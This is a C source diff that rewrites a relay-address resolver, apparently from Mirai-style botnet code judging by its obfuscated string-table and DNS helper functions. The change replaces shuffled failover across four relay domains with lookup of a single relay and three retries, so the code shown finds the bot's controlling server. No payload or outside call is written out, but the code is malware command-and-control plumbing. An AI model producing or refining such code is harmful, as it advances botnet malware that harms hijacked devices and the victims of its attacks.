@@ -44,59 +44,38 @@ extern struct sockaddr_in srv_addr;
 static void resolve_relay_addr(void)
 {
     srv_addr.sin_family = AF_INET;
+    srv_addr.sin_port = htons(RELAY_PORT);
 
-    // Try all available relays in random order until one works
-    int relay_order[4] = {0, 1, 2, 3};
+    table_unlock_val(TABLE_RELAY_1);
+    char *domain = table_retrieve_val(TABLE_RELAY_1, NULL);
     
-    // Shuffle the relay order
-    for (int i = 3; i > 0; i--)
+    if (domain == NULL || util_strlen(domain) == 0)
     {
-        int j = rand_next() % (i + 1);
-        int tmp = relay_order[i];
-        relay_order[i] = relay_order[j];
-        relay_order[j] = tmp;
+        table_lock_val(TABLE_RELAY_1);
+        return;
     }
     
-    for (int attempt = 0; attempt < 4; attempt++)
+    struct resolv_entries *entries = NULL;
+    int retries = 3;
+    
+    while (retries > 0 && entries == NULL)
     {
-        int relay_index = TABLE_RELAY_1 + relay_order[attempt];
-        table_unlock_val(relay_index);
-        char *relay_domain = table_retrieve_val(relay_index, NULL);
-        
-        // Skip empty relay entries (domains that weren't configured)
-        if (util_strlen(relay_domain) == 0)
+        entries = resolv_lookup(domain);
+        if (entries == NULL)
         {
-            table_lock_val(relay_index);
-            continue;
+            retries--;
+            if (retries > 0)
+                sleep(2);
         }
-        
-        struct resolv_entries *entries = NULL;
-        int retries = 1;
-        
-        while (retries >= 0 && entries == NULL)
-        {
-            entries = resolv_lookup(relay_domain);
-            if (entries == NULL)
-            {
-                retries--;
-                if (retries >= 0)
-                    sleep(1);
-            }
-        }
-        
-        table_lock_val(relay_index);
-        
-        if (entries != NULL && entries->addrs_len > 0)
-        {
-            srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
-            srv_addr.sin_port = htons(RELAY_PORT);
-            resolv_entries_free(entries);
-            return;
-        }
-        
-        if (entries)
-            resolv_entries_free(entries);
     }
+    
+    table_lock_val(TABLE_RELAY_1);
+    
+    if (entries == NULL)
+        return;
+    
+    srv_addr.sin_addr.s_addr = entries->addrs[0];
+    resolv_entries_free(entries);
 }
 #endif
 
